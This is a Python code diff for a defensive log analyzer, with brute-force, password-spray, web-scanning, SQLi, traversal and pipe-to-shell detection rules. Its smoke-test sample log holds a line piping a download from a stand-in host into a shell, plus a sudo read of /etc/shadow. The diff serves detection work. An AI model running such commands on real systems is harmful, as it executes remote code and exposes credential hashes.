+    if not matched:
+        return []
+    sev = "medium"
+    if len(matched) >= 6:
+        sev = "high"
+    return [
+        _mk_finding(
+            rule_name="Brute force indicators",
+            display_name="Brute force indicators",
+            severity=sev,
+            summary=f"{len(matched)} brute force related indicators",
+            description="The log contains indicators such as port scan, many connection attempts, or too many authentication attempts. This may indicate scanning or brute force.",
+            matched_lines=_clamp_lines(matched, cfg),
+            salt=str(len(matched)),
+        )
+    ]
+
+
+def _rule_web_sensitive_paths(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    hits: List[str] = []
+    for ev in events:
+        if _allowlisted_entity(ev, cfg):
+            continue
+        if _is_sensitive_web_probe(ev, cfg):
+            hits.append(ev.raw)
+    if not hits:
+        return []
+    sev = "high" if any("/.env" in h.lower() or "/.git" in h.lower() for h in hits) else "medium"
+    return [
+        _mk_finding(
+            rule_name="Sensitive path probing",
+            display_name="Sensitive path probing",
+            severity=sev,
+            summary=f"{len(hits)} requests to sensitive URLs",
+            description="Attempts to access files and endpoints commonly targeted during scanning and exploitation, such as .env or .git. Check the source IP and block if needed.",
+            matched_lines=_clamp_lines(hits, cfg),
+            salt=str(len(hits)),
+        )
+    ]
+
+
+def _rule_sqli_attempts(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_sqli(ev)]
+    if not hits:
+        return []
+    return [
+        _mk_finding(
+            rule_name="SQL injection attempts",
+            display_name="SQL injection attempts",
+            severity="high",
+            summary=f"{len(hits)} possible SQLi payloads",
+            description="The log contains patterns such as UNION SELECT or time based functions commonly used in SQL injection. Verify input validation and WAF rules.",
+            matched_lines=_clamp_lines(hits, cfg),
+            salt=str(len(hits)),
+        )
+    ]
+
+
+def _rule_path_traversal_attempts(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_path_traversal(ev)]
+    if not hits:
+        return []
+    return [
+        _mk_finding(
+            rule_name="Path traversal attempts",
+            display_name="Path traversal attempts",
+            severity="high",
+            summary=f"{len(hits)} traversal indicators",
+            description="The log contains dot dot slash variants or direct references to sensitive files. This may indicate attempts to read files outside the web root.",
+            matched_lines=_clamp_lines(hits, cfg),
+            salt=str(len(hits)),
+        )
+    ]
+
+
+def _rule_malware_downloads(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_download(ev)]
+    if not hits:
+        return []
+    # Pipe to shell är extra allvarligt
+    pipe_hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_pipe_to_shell(ev)]
+    if pipe_hits:
+        return [
+            _mk_finding(
+                rule_name="Download piped to shell",
+                display_name="Download piped to shell",
+                severity="critical",
+                summary=f"{len(pipe_hits)} lines with curl or wget piped to a shell",
+                description="Patterns like curl or wget piped to sh or bash are commonly used for payload execution. This is highly suspicious unless it is a known installer in a controlled environment.",
+                matched_lines=_clamp_lines(pipe_hits, cfg),
+                salt=str(len(pipe_hits)),
+            )
+        ]
+    return [
+        _mk_finding(
+            rule_name="Suspicious payload download",
+            display_name="Suspicious payload download",
+            severity="high",
+            summary=f"{len(hits)} download attempts",
+            description="Patterns like curl, wget, or PowerShell downloads can be legitimate, but they are also common in malware droppers. Verify process, user, and destination.",
+            matched_lines=_clamp_lines(hits, cfg),
+            salt=str(len(hits)),
+        )
+    ]
+
+
+def _rule_cron_and_tasks(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    hits = [ev.raw for ev in events if not _allowlisted_entity(ev, cfg) and _is_cron_change(ev)]
+    if not hits:
+        return []
+    return [
+        _mk_finding(
+            rule_name="Scheduled tasks and cron changes",
+            display_name="Scheduled tasks and cron changes",
+            severity="medium",
+            summary=f"{len(hits)} lines involving cron or scheduling",
+            description="Changes to cron or scheduled tasks can be used for persistence. Verify that the change is intentional and comes from a known admin source.",
+            matched_lines=_clamp_lines(hits, cfg),
+            salt=str(len(hits)),
+        )
+    ]
+
+
+def _rule_correlate_ssh_bruteforce(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    # Sliding window per IP
+    window = int(cfg["windows"]["auth_seconds"])
+    min_hits = int(cfg["thresholds"]["ssh_bruteforce_ip_min"])
+
+    buckets: Dict[str, deque[Event]] = defaultdict(deque)
+    findings: List[Dict[str, Any]] = []
 
     for ev in events:
-        if ev.kind == "auth_fail":
-            for ip in ev.ips or ("(no-ip)",):
-                auth_fail_by_ip[ip].append(ev)
-                if ev.user:
-                    auth_fail_user_by_ip[ip][ev.user] += 1
-        elif ev.kind == "auth_success":
-            for ip in ev.ips or ("(no-ip)",):
-                auth_ok_by_ip[ip].append(ev)
-        elif ev.kind in ("sudo_exec", "sudo_fail"):
-            sudo_events.append(ev)
-        elif ev.kind == "account_change":
-            account_events.append(ev)
-        elif ev.kind == "privilege_change":
-            priv_events.append(ev)
-        elif ev.kind in ("web_sqli", "web_xss", "web_lfi"):
-            for ip in ev.ips or ("(no-ip)",):
-                web_events_by_ip[ip].append(ev)
-        elif ev.kind == "suspicious_exec":
-            exec_events.append(ev)
-
-    findings: List[Dict] = []
-
-    # 1) Repeated failed logins, per IP (pick only those above threshold)
-    for ip, fails in auth_fail_by_ip.items():
-        if ip == "(no-ip)":
+        if not _is_failed_login(ev):
             continue
-        if len(fails) < 6:
-            continue
+        ip = ev.primary_ip() or "unknown"
+        q = buckets[ip]
+        q.append(ev)
+        # Pop events outside window
+        while q and (ev.time_key - q[0].time_key) > window:
+            q.popleft()
 
-        ts_list = [e.ts for e in fails if e.ts]
-        tr = _time_range([t for t in ts_list if t])
-
-        top_users = auth_fail_user_by_ip[ip]
-        user_summary = _fmt_top(top_users)
-
-        # Correlation: any success from same IP within window after last fail
-        fail_then_success = False
-        if ts_list and auth_ok_by_ip.get(ip):
-            last_fail = max(t for t in ts_list if t)
-            for ok in auth_ok_by_ip[ip]:
-                if ok.ts and 0 <= (ok.ts - last_fail).total_seconds() <= _WINDOW_SECONDS:
-                    fail_then_success = True
-                    break
-
-        severity = "high"
-        if len(fails) >= 20:
-            severity = "critical"
-        elif fail_then_success:
-            severity = "critical"
-        elif len(fails) >= 10:
-            severity = "high"
-        else:
-            severity = "high"
-
-        summary = f"{len(fails)} misslyckade inloggningar från {ip}."
-
-        details_lines: List[str] = []
-        if user_summary:
-            details_lines.append(f"Top användarnamn: {user_summary}.")
-        if fail_then_success:
-            details_lines.append("Mönster: misslyckanden följt av lyckad inloggning.")
-        if tr:
-            details_lines.append(f"Time window: {tr}.")
-
-        matched = [e.raw for e in fails]
-        matched, trunc_note = _cap_lines(matched)
-        if trunc_note:
-            details_lines.append(trunc_note)
-
-        details = "\n".join(details_lines) if details_lines else ""
-
-        findings.append(
-            {
-                "id": _sha_id("auth_fail", ip, str(len(fails)), tr or ""),
-                "rule_name": "Upprepade misslyckade inloggningar",
-                "display_name": "Repeated Failed Login Attempts",
-                "severity": severity,
-                "summary": summary,
-                "description": f"Detected {len(fails)} failed login attempts.",
-                "details": details,
-                "matched_lines": matched,
-                "count": len(fails),
-                "entities": {"ip": ip, "users": [u for u, _ in top_users.most_common(_TOP_N)]},
-                "time_range": tr,
-            }
-        )
-
-    # 2) SSH auth failures (low volume), only if no repeated finding exists
-    if not any(f["rule_name"] == "Upprepade misslyckade inloggningar" for f in findings):
-        # Aggregate all auth_fail events that look like sshd
-        ssh_fails = [e for e in events if e.kind == "auth_fail" and "sshd" in e.raw.lower()]
-        if len(ssh_fails) >= 2:
-            ips = Counter(ip for e in ssh_fails for ip in e.ips)
-            users = Counter(e.user for e in ssh_fails if e.user)
-            ts_list = [e.ts for e in ssh_fails if e.ts]
-            tr = _time_range([t for t in ts_list if t])
-            sev = "medium" if len(ssh_fails) < 10 else "high"
-            summary = f"{len(ssh_fails)} SSH autentiseringsfel." 
-            details_lines = []
-            if ips:
-                details_lines.append(f"Top IP: {_fmt_top(ips)}.")
-            if users:
-                details_lines.append(f"Top användare: {_fmt_top(users)}.")
-            if tr:
-                details_lines.append(f"Time window: {tr}.")
-            matched, trunc_note = _cap_lines([e.raw for e in ssh_fails])
-            if trunc_note:
-                details_lines.append(trunc_note)
+        if len(q) == min_hits:
+            lines = [e.raw for e in list(q)]
             findings.append(
-                {
-                    "id": _sha_id("ssh_auth", str(len(ssh_fails)), tr or ""),
-                    "rule_name": "SSH autentiseringsfel",
-                    "display_name": "SSH Authentication Failures",
-                    "severity": sev,
-                    "summary": summary,
-                    "description": f"Detected {len(ssh_fails)} SSH authentication failures.",
-                    "details": "\n".join(details_lines),
-                    "matched_lines": matched,
-                    "count": len(ssh_fails),
-                    "entities": {"ips": [k for k, _ in ips.most_common(_TOP_N)], "users": [k for k, _ in users.most_common(_TOP_N)]},
-                    "time_range": tr,
-                }
+                _mk_finding(
+                    rule_name="SSH brute force per IP",
+                    display_name="SSH brute force per IP",
+                    severity="high",
+                    summary=f"{len(q)} failed logins from {ip} within {window} seconds",
+                    description="Repeated failed logins from the same IP within a short time window indicate brute force. Block the IP and verify whether any login succeeded afterward.",
+                    matched_lines=_clamp_lines(lines, cfg),
+                    salt=f"{ip}|{ev.time_key}",
+                )
             )
-
-    # 3) Sudo command execution, separate note for incorrect passwords
-    if sudo_events:
-        bad_pw = [e for e in sudo_events if e.kind == "sudo_fail"]
-        all_sudo = [e for e in sudo_events if e.kind in ("sudo_exec", "sudo_fail")]
-        users = Counter(e.user for e in all_sudo if e.user)
-        ts_list = [e.ts for e in all_sudo if e.ts]
-        tr = _time_range([t for t in ts_list if t])
-        sev = "low"
-        details_lines = []
-        if bad_pw:
-            sev = "medium" if len(bad_pw) >= 3 else "low"
-            details_lines.append(f"Felaktiga sudo lösenord: {len(bad_pw)}.")
-        if users:
-            details_lines.append(f"Users: {_fmt_top(users)}.")
-        if tr:
-            details_lines.append(f"Time window: {tr}.")
-        matched, trunc_note = _cap_lines([e.raw for e in all_sudo])
-        if trunc_note:
-            details_lines.append(trunc_note)
-        findings.append(
-            {
-                "id": _sha_id("sudo", str(len(all_sudo)), tr or ""),
-                "rule_name": "Sudo-kommandokörning",
-                "display_name": "Sudo Command Execution",
-                "severity": sev,
-                "summary": f"{len(all_sudo)} sudo händelser.",
-                "description": f"Detected {len(all_sudo)} sudo command executions.",
-                "details": "\n".join(details_lines),
-                "matched_lines": matched,
-                "count": len(all_sudo),
-                "entities": {"users": [k for k, _ in users.most_common(_TOP_N)]},
-                "time_range": tr,
-            }
-        )
-
-    # 4) Account changes
-    if account_events:
-        users = Counter(e.user for e in account_events if e.user)
-        ips = Counter(ip for e in account_events for ip in e.ips)
-        ts_list = [e.ts for e in account_events if e.ts]
-        tr = _time_range([t for t in ts_list if t])
-        sev = "medium"
-        details_lines = []
-        if users:
-            details_lines.append(f"Users: {_fmt_top(users)}.")
-        if ips:
-            details_lines.append(f"IPs: {_fmt_top(ips)}.")
-        if tr:
-            details_lines.append(f"Time window: {tr}.")
-        matched, trunc_note = _cap_lines([e.raw for e in account_events])
-        if trunc_note:
-            details_lines.append(trunc_note)
-        findings.append(
-            {
-                "id": _sha_id("acct", str(len(account_events)), tr or ""),
-                "rule_name": "Ändringar av användarkonton",
-                "display_name": "User Account Changes",
-                "severity": sev,
-                "summary": f"{len(account_events)} kontoändringar.",
-                "description": "Detected user or group account changes.",
-                "details": "\n".join(details_lines),
-                "matched_lines": matched,
-                "count": len(account_events),
-                "entities": {"users": [k for k, _ in users.most_common(_TOP_N)], "ips": [k for k, _ in ips.most_common(_TOP_N)]},
-                "time_range": tr,
-            }
-        )
-
-    # 5) Privilege escalation attempts
-    if priv_events:
-        ips = Counter(ip for e in priv_events for ip in e.ips)
-        users = Counter(e.user for e in priv_events if e.user)
-        ts_list = [e.ts for e in priv_events if e.ts]
-        tr = _time_range([t for t in ts_list if t])
-        details_lines = []
-        if users:
-            details_lines.append(f"Users: {_fmt_top(users)}.")
-        if ips:
-            details_lines.append(f"IPs: {_fmt_top(ips)}.")
-        if tr:
-            details_lines.append(f"Time window: {tr}.")
-        matched, trunc_note = _cap_lines([e.raw for e in priv_events])
-        if trunc_note:
-            details_lines.append(trunc_note)
-        findings.append(
-            {
-                "id": _sha_id("priv", str(len(priv_events)), tr or ""),
-                "rule_name": "Privilege Escalation Attempts",
-                "display_name": "Privilege Escalation Attempts",
-                "severity": "critical",
-                "summary": f"{len(priv_events)} möjliga privilege escalation händelser.",
-                "description": "Potential privilege escalation patterns detected.",
-                "details": "\n".join(details_lines),
-                "matched_lines": matched,
-                "count": len(priv_events),
-                "entities": {"users": [k for k, _ in users.most_common(_TOP_N)], "ips": [k for k, _ in ips.most_common(_TOP_N)]},
-                "time_range": tr,
-            }
-        )
-
-    # 6) Web attack patterns per IP
-    for ip, wevs in web_events_by_ip.items():
-        if ip == "(no-ip)":
-            continue
-        kinds = Counter(e.kind for e in wevs)
-        sev = "high"
-        if kinds.get("web_sqli", 0) >= 1 and kinds.get("web_lfi", 0) >= 1:
-            sev = "critical"
-        if kinds.get("web_sqli", 0) >= 2:
-            sev = "critical"
-        summary_parts = []
-        if kinds.get("web_sqli"):
-            summary_parts.append(f"SQLi: {kinds['web_sqli']}")
-        if kinds.get("web_xss"):
-            summary_parts.append(f"XSS: {kinds['web_xss']}")
-        if kinds.get("web_lfi"):
-            summary_parts.append(f"LFI: {kinds['web_lfi']}")
-        summary = f"Webbattacker från {ip}. " + ", ".join(summary_parts) + "."
-        ts_list = [e.ts for e in wevs if e.ts]
-        tr = _time_range([t for t in ts_list if t])
-        details_lines = [f"Typer: {', '.join(f'{k} ({v})' for k, v in kinds.items())}."]
-        if tr:
-            details_lines.append(f"Time window: {tr}.")
-        matched, trunc_note = _cap_lines([e.raw for e in wevs])
-        if trunc_note:
-            details_lines.append(trunc_note)
-        findings.append(
-            {
-                "id": _sha_id("web", ip, tr or ""),
-                "rule_name": "Misstänkta webbförfrågningar",
-                "display_name": "Suspicious Web Requests",
-                "severity": sev,
-                "summary": summary,
-                "description": "Detected suspicious web request patterns.",
-                "details": "\n".join(details_lines),
-                "matched_lines": matched,
-                "count": len(wevs),
-                "entities": {"ip": ip},
-                "time_range": tr,
-            }
-        )
-
-    # 7) Suspicious download or execution
-    if exec_events:
-        ips = Counter(ip for e in exec_events for ip in e.ips)
-        ts_list = [e.ts for e in exec_events if e.ts]
-        tr = _time_range([t for t in ts_list if t])
-        details_lines = []
-        if ips:
-            details_lines.append(f"IPs: {_fmt_top(ips)}.")
-        if tr:
-            details_lines.append(f"Time window: {tr}.")
-        matched, trunc_note = _cap_lines([e.raw for e in exec_events])
-        if trunc_note:
-            details_lines.append(trunc_note)
-        findings.append(
-            {
-                "id": _sha_id("exec", str(len(exec_events)), tr or ""),
-                "rule_name": "Suspicious Download or Execution",
-                "display_name": "Suspicious Download or Execution",
-                "severity": "critical",
-                "summary": f"{len(exec_events)} misstänkta nedladdnings eller körmönster.",
-                "description": "Detected suspicious download or execution behavior.",
-                "details": "\n".join(details_lines),
-                "matched_lines": matched,
-                "count": len(exec_events),
-                "entities": {"ips": [k for k, _ in ips.most_common(_TOP_N)]},
-                "time_range": tr,
-            }
-        )
-
-    # De duplicate: if both privilege and account changes exist, keep both
-    # but avoid multiple web findings for same IP by id.
-
-    findings.sort(
-        key=lambda f: (
-            SEVERITY_ORDER.get(str(f.get("severity", "")).lower(), 99),
-            (f.get("display_name") or f.get("rule_name") or "").lower(),
-        )
-    )
 
     return findings
 
 
-__all__ = ["analyze_log_content"]
+def _rule_correlate_password_spray(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    window = int(cfg["windows"]["auth_seconds"])
+    min_users = int(cfg["thresholds"]["password_spray_unique_users_min"])
+    min_total = int(cfg["thresholds"]["password_spray_total_min"])
+
+    per_ip_events: Dict[str, deque[Event]] = defaultdict(deque)
+    findings: List[Dict[str, Any]] = []
+
+    for ev in events:
+        if not _is_failed_login(ev):
+            continue
+        ip = ev.primary_ip() or "unknown"
+        q = per_ip_events[ip]
+        q.append(ev)
+        while q and (ev.time_key - q[0].time_key) > window:
+            q.popleft()
+
+        if len(q) >= min_total:
+            users = {e.username for e in q if e.username}
+            if len(users) >= min_users:
+                lines = [e.raw for e in list(q)]
+                findings.append(
+                    _mk_finding(
+                        rule_name="Password spraying",
+                        display_name="Password spraying",
+                        severity="high",
+                        summary=f"{len(q)} failed attempts against {len(users)} distinct users from {ip}",
+                        description="Many failed logins across many different users from the same IP indicate password spraying. Check for lockouts and apply blocking or MFA.",
+                        matched_lines=_clamp_lines(lines, cfg),
+                        salt=f"{ip}|{ev.time_key}|{len(users)}",
+                    )
+                )
+                # To avoid noise, clear the window after flagging once
+                q.clear()
+
+    return findings
+
+
+def _rule_correlate_fail_then_success(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    window = int(cfg["windows"]["auth_seconds"])
+    min_fails = 5
+
+    # Track failures per (ip, user)
+    fails: Dict[Tuple[str, str], deque[Event]] = defaultdict(deque)
+    findings: List[Dict[str, Any]] = []
+
+    for ev in events:
+        ip = ev.primary_ip() or "unknown"
+        user = ev.username or "unknown"
+        key = (ip, user)
+
+        if _is_failed_login(ev):
+            q = fails[key]
+            q.append(ev)
+            while q and (ev.time_key - q[0].time_key) > window:
+                q.popleft()
+            continue
+
+        if _is_ssh_success(ev):
+            q = fails.get(key)
+            if q and len(q) >= min_fails:
+                lines = [e.raw for e in list(q)] + [ev.raw]
+                findings.append(
+                    _mk_finding(
+                        rule_name="Successful login after multiple failures",
+                        display_name="Successful login after multiple failures",
+                        severity="critical",
+                        summary=f"Login succeeded for {user} from {ip} after {len(q)} failed attempts",
+                        description="A successful login immediately after many failures can indicate the attacker guessed correctly or obtained valid credentials. Review account activity and rotate credentials.",
+                        matched_lines=_clamp_lines(lines, cfg),
+                        salt=f"{ip}|{user}|{ev.time_key}",
+                    )
+                )
+                # Clear to avoid repeated findings for the same session
+                q.clear()
+
+    return findings
+
+
+def _rule_correlate_web_scanning(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    window = int(cfg["windows"]["web_seconds"])
+    min_unique = int(cfg["thresholds"]["web_404_unique_paths_min"])
+    findings: List[Dict[str, Any]] = []
+
+    per_ip: Dict[str, deque[Event]] = defaultdict(deque)
+
+    for ev in events:
+        ip = ev.primary_ip() or None
+        if not ip or _allowlisted_entity(ev, cfg):
+            continue
+        if ev.http_status != 404:
+            continue
+        path = ev.http_path or None
+        if not path:
+            continue
+
+        q = per_ip[ip]
+        q.append(ev)
+        while q and (ev.time_key - q[0].time_key) > window:
+            q.popleft()
+
+        unique_paths = {e.http_path for e in q if e.http_path}
+        if len(unique_paths) >= min_unique:
+            lines = [e.raw for e in list(q)]
+            findings.append(
+                _mk_finding(
+                    rule_name="Web scanning with many 404s",
+                    display_name="Web scanning with many 404s",
+                    severity="medium",
+                    summary=f"{len(unique_paths)} unique paths returned 404 from {ip} within {window} seconds",
+                    description="Many 404 responses across many different endpoints from the same IP in a short time window are typical of directory brute force and scanning.",
+                    matched_lines=_clamp_lines(lines, cfg),
+                    salt=f"{ip}|{ev.time_key}|{len(unique_paths)}",
+                )
+            )
+            q.clear()
+
+    return findings
+
+
+def _rule_correlate_web_401_403(events: List[Event], cfg: Dict[str, Any]) -> List[Dict[str, Any]]:
+    window = int(cfg["windows"]["web_seconds"])
+    min_hits = int(cfg["thresholds"]["web_401_403_min"])
+    per_ip: Dict[str, deque[Event]] = defaultdict(deque)
+    findings: List[Dict[str, Any]] = []
+
+    for ev in events:
+        ip = ev.primary_ip() or None
+        if not ip or _allowlisted_entity(ev, cfg):
+            continue
+        if ev.http_status not in {401, 403}:
+            continue
+        q = per_ip[ip]
+        q.append(ev)
+        while q and (ev.time_key - q[0].time_key) > window:
+            q.popleft()
+        if len(q) >= min_hits:
+            lines = [e.raw for e in list(q)]
+            findings.append(
+                _mk_finding(
+                    rule_name="Many 401 or 403 from the same IP",
+                    display_name="Many 401 or 403 from the same IP",
+                    severity="medium",
+                    summary=f"{len(q)} responses with 401 or 403 from {ip} within {window} seconds",
+                    description="Many 401 or 403 responses from the same IP in a short time window may indicate brute force against protected endpoints or credential stuffing.",
+                    matched_lines=_clamp_lines(lines, cfg),
+                    salt=f"{ip}|{ev.time_key}|{len(q)}",
+                )
+            )
+            q.clear()
+
+    return findings
+
+
+def _dedupe_findings(findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+    seen: set[str] = set()
+    out: List[Dict[str, Any]] = []
+    for f in findings:
+        fid = str(f.get("id") or "")
+        if not fid:
+            continue
+        if fid in seen:
+            continue
+        seen.add(fid)
+        out.append(f)
+    return out
+
+
+# -------------------------
+# Publik API
+# -------------------------
+
+_SAMPLE_SUSPICIOUS_LOG = """2026-02-14 10:00:01 sshd[1001]: Failed password for invalid user admin from 203.0.113.10 port 55221 ssh2
+2026-02-14 10:00:03 sshd[1002]: Failed password for invalid user root from 203.0.113.10 port 55222 ssh2
+2026-02-14 10:00:05 sshd[1003]: Failed password for invalid user test from 203.0.113.10 port 55223 ssh2
+2026-02-14 10:00:07 sshd[1004]: Failed password for invalid user admin from 203.0.113.10 port 55224 ssh2
+2026-02-14 10:00:09 sshd[1005]: Failed password for invalid user admin from 203.0.113.10 port 55225 ssh2
+2026-02-14 10:00:11 sshd[1006]: Failed password for invalid user admin from 203.0.113.10 port 55226 ssh2
+2026-02-14 10:00:12 sshd[1007]: Accepted password for admin from 203.0.113.10 port 55227 ssh2
+127.0.0.1 - - [14/Feb/2026:10:00:20 +0000] "GET /.env HTTP/1.1" 404 123 "-" "sqlmap/1.7"
+sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/bin/cat /etc/shadow
+curl http://evil.example/payload.sh | sh
+"""
+
+def analyze_log_content(log_text: str) -> List[Dict[str, Any]]:
+    """Analyze log text deterministically and return a list of findings.
+
+    Always returns a list to match the existing app.py contract.
+    """
+    if not isinstance(log_text, str):
+        raise LogAnalyzerError(
+            user_message="Invalid input type for log text.",
+            status_code=400,
+            technical_message=str(type(log_text)),
+        )
+
+    normalized = log_text.strip("\ufeff\n\r\t ")
+    if not normalized:
+        return []
+
+    cfg = _get_config()
+    events = _parse_events(normalized, cfg)
+
+    if _env_debug_enabled():
+        logger.info("[LogAnalyzerDebug] lines=%d sample=%r", len(events), events[0].raw[:200] if events else "")
+
+    findings: List[Dict[str, Any]] = []
+
+    # Baseline rules (also used by tests)
+    findings.extend(_rule_failed_login_totals(events, cfg))
+    findings.extend(_rule_ssh_auth_failures(events, cfg))
+    findings.extend(_rule_sudo_commands(events, cfg))
+    findings.extend(_rule_user_account_changes(events, cfg))
+    findings.extend(_rule_suspicious_ip_lines(events, cfg))
+    findings.extend(_rule_bruteforce_indicators(events, cfg))
+
+    # Additional rules for broader coverage
+    findings.extend(_rule_web_sensitive_paths(events, cfg))
+    findings.extend(_rule_sqli_attempts(events, cfg))
+    findings.extend(_rule_path_traversal_attempts(events, cfg))
+    findings.extend(_rule_malware_downloads(events, cfg))
+    findings.extend(_rule_cron_and_tasks(events, cfg))
+
+    # Correlation rules
+    findings.extend(_rule_correlate_ssh_bruteforce(events, cfg))
+    findings.extend(_rule_correlate_password_spray(events, cfg))
+    findings.extend(_rule_correlate_fail_then_success(events, cfg))
+    findings.extend(_rule_correlate_web_scanning(events, cfg))
+    findings.extend(_rule_correlate_web_401_403(events, cfg))
+
+    findings = _dedupe_findings(findings)
+    findings = _sort_findings(findings)
+
+    return findings
+
+
+def run_internal_smoke_test() -> None:
+    """Internal sanity check that does not affect UI or routes."""
+    findings = analyze_log_content(_SAMPLE_SUSPICIOUS_LOG)
+    if not isinstance(findings, list):
+        raise AssertionError("findings must be a list")
+    if not any((f.get("severity") in {"high", "critical"}) for f in findings):
+        raise AssertionError("smoke test förväntar minst ett high eller critical fynd")
+    if len(findings) < 2:
+        raise AssertionError("smoke test förväntar flera fynd")
